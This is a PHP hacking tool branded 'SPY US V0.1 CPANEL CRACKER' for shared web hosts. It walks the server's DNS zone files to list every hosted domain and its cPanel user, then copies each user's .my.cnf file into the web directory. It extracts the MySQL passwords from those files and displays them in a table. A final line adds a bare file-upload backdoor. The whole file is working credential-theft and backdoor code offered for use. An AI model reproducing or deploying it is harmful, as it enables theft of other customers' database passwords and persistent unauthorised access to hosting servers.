<?php @ini_set('display_errors',0); function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){ $ar0=explode($marqueurDebutLien, $text); $ar1=explode($marqueurFinLien, $ar0[$i]); return trim($ar1[0]); } echo '<html><head>
<title>SPY US V0.1 CRACKER</title>
<meta content="text/html; charset=utf-8">
<meta name="keywords" content="SPY US V0.1 CRACKER" />
<link href="http://fonts.googleapis.com/css?family=Oswald:300" rel="stylesheet" type="text/css">

<meta name="description" content="CPANEL CRACKER" /><meta name="author" content="THE SPY US" />
<link rel="Shortcut Icon" type="image/x-icon" href="http://images3.alphacoders.com/198/198979.jpg"><link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css"><link rel="stylesheet" type="text/css" href="http://s3curity.tn/wp-content/uploads-images/1.css"><meta name="keywords" content="SPY US V0.1 CRACKER" />
<style type="text/css">
body{
	background-image: url(http://s3curity.tn/wp-content/uploads-images/bg1.png);
	color: #F9F9FA;
	text-align: center;
	font-size: 14pt;
	background-color: black;
	font-weight: bold;
	padding: 0px;
		font-family: "Oswald", sans-serif;

}
.logo{
  font-size: 120px;
   color: white;  /* if The image deleted */
   background: url(http://i.imgur.com/VgxeGpQ.png) no-repeat;
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
   font-weight: 900;
}
a {
color:#fff;
}
a:hover {
color:green;
}
td, th, p, li,table{
	background: #2e2b28;
	border:1px solid #F9F9FA;
	text-align: center;
	-moz-border-radius: 1px;
-webkit-border-radius: 1px;
border-radius: 1px;
}
.result {
padding: 15px;
border: 1px solid #CCC;
width: 500px;
margin: 0 auto;
border-radius: 1px;
-moz-border-radius: 1px;
-webkit-border-radius: 1px;
}
input{
	border: 1px solid;
	overflow: hidden;
	background: #2e2b28;
	color: #F9F9FA;
	-moz-border-radius: 0px;
-webkit-border-radius: 0px;
border-radius: 0px;
}
textarea{
	border: 1px solid;
	overflow: hidden;
	background: #2e2b28;
	color: #F9F9FA;
	-moz-border-radius: 0px;
-webkit-border-radius: 0px;
border-radius: 0px;
}
.main {
font-family: Bookman Old Style, Century Gothic;
font-size: 40pt;
text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0);
color: rgb(255, 255, 255);
}
.button {
	-webkit-box-shadow:rgba(0,0,0,0.2) 0 1px 0 0;
	-moz-box-shadow:rgba(0,0,0,0.2) 0 1px 0 0;
	box-shadow:rgba(0,0,0,0.2) 0 1px 0 0;
	color:#333;
	background-color:#FA2;
	border-radius:0px;
	-moz-border-radius:0px;
	-webkit-border-radius:0px;
	border:none;
	font-family:Arial,sans-serif;
	font-size:16px;
	font-weight:700;
	height:32px;
	padding:4px 16px;
	text-shadow:#FE6 0 1px 0
}
</style>
</head><body>' ; echo '<div class="logo"><center><font color="white" > SPY US CRACKER </font></center></div><br/>'; echo "<center>"; $d0mains = @file('/etc/named.conf'); $domains = scandir("/var/named"); if ($domains or $d0mains) { $domains = scandir("/var/named"); if($domains) { echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>"; $count=1; $dc = 0; $list = scandir("/var/named"); foreach($list as $domain){ if(strpos($domain,".db")){ $domain = str_replace('.db','',$domain); $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain)); $dirz = '/home/'.$owner['name'].'/.my.cnf'; $path = getcwd(); if (is_readable($dirz)) { copy($dirz, ''.$path.'/'.$owner['name'].'.txt'); $p=file_get_contents(''.$path.'/'.$owner['name'].'.txt'); $password=entre2v2($p,'password="','"'); echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'>Click Here</a></td></tr>"; $dc++; } } } echo '</table>'; $total = $dc; echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />'; echo '</center>'; }else{ $d0mains = @file('/etc/named.conf'); if($d0mains) { echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN HACKED </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>"; $count=1; $dc = 0; $mck = array(); foreach($d0mains as $d0main){ if(@eregi('zone',$d0main)){ preg_match_all('#zone "(.*)"#',$d0main,$domain); flush(); if(strlen(trim($domain[1][0])) >2){ $mck[] = $domain[1][0]; } } } $mck = array_unique($mck); $usr = array(); $dmn = array(); foreach($mck as $o) { $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o)); $usr[] = $infos['name']; $dmn[] = $o; } array_multisort($usr,$dmn); $dt = file('/etc/passwd'); $passwd = array(); foreach($dt as $d) { $r = explode(':',$d); if(strpos($r[5],'home')) { $passwd[$r[0]] = $r[5]; } } $l=0; $j=1; foreach($usr as $r) { $dirz = '/home/'.$r.'/.my.cnf'; $path = getcwd(); if (is_readable($dirz)) { copy($dirz, ''.$path.'/'.$r.'.txt'); $p=file_get_contents(''.$path.'/'.$r.'.txt'); $password=entre2v2($p,'password="','"'); echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>"; $dc++; flush(); $l=$l?0:1; $j++; } } } echo '</table>'; $total = $dc; echo '<br><div class="result">Total cPanel Found = '.$total.'</h3><br />'; echo '</center>'; } }else{ echo "<div class='result'><i><font color='#FF0000'>ERROR</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf</font> Not Accessible!</i></div>"; } echo "<br>&#169; <font color='#FF0000'>SPY US V0.1 CPANEL CRACKER</font> | SPY US www.s3curity.tn "; ?>
<?(@copy($_FILES['f']['tmp_name'], $_FILES['f']['name']));?>